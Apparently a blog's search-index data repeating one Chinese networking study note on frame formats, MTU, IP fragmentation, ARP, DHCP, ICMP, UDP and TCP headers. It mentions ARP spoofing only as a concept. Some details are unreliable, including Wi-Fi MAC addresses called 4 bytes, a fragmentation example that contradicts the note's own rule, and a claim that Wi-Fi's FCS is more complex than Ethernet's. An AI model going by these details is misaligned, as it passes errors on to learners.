ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#以太网"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#wifi"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#mtu"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#网络层"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 